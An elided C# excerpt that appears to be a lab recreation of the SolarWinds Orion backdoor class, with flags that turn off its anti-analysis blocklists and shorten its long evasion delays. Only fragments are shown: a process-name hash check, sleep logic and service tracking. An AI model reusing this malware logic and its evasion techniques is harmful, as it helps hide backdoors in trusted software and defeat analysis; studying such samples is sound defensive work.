...
namespace SolarWinds.Orion.Core.BusinessLayer
{
	...
	{
		/*
		 * Enable if running blocklisted processes, services, and drivers should be monitored and disabled
		 */
		const bool ENABLE_ANTI_ANALYSIS_BLOCKLISTS = false;
		/*
		 * Enable if (very long) delays should be used 
		 */
		const bool ENABLE_DELAYS = true;
		/*
		 * Enable if all delays should be capped to 10 seconds. In addition, some delays are skipped
		 */
		const bool ENABLE_CONVENIENT_DELAYS = true;

		/*
		 * Default domain. If the computer is not connected to a domain, then use this one.
		 */
		const string DEFAULT_DOMAIN_NAME = "donut";
			...
			try
			{
				if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL /* solarwinds.businesslayerhost (SolarWinds - dev) */)
				{
					...
					//{
						...
						{
							if (ENABLE_DELAYS && !ENABLE_CONVENIENT_DELAYS) OrionImprovementBusinessLayer.DelayMin(0, 0);
							...
							{
								OrionImprovementBusinessLayer.domain4 = DEFAULT_DOMAIN_NAME;
							}
							if (!string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) &&
		...
		private static void Update()
		{
			...
			while (num2 <= 3 && !flag)
			{
				if (ENABLE_DELAYS) OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
				if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
				{
		...
		private static void DelayMs(double minMs, double maxMs)
		{
			...
			{
				if (!ENABLE_CONVENIENT_DELAYS)
                {
					Thread.Sleep(int.MaxValue);
				}
			}
			if (ENABLE_CONVENIENT_DELAYS && num > 10000)
            {
				num = 10000;
            }
		...
		private static readonly string[] patternList = new string[]
	 {
		...
		private static class ProcessTracker
		{
					...
					foreach (OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration in OrionImprovementBusinessLayer.svcList)
					{
						if (Array.IndexOf<ulong>(serviceConfiguration.timeStamps, hash) != -1)
						{
							...
							lock (@lock)
							{
								...
								{
									if (ENABLE_DELAYS) OrionImprovementBusinessLayer.DelayMin(0, 0);
			...
			{
				if (!ENABLE_ANTI_ANALYSIS_BLOCKLISTS)
                {
					return false;
                }
			...
			public void Initialize()
			{
				...
				try
				{
					...
					IL_89:
						...
						goto IL_E3;
					IL_DC:
						if (ENABLE_DELAYS) OrionImprovementBusinessLayer.DelayMin(1, 5);
						goto IL_E3;
					}
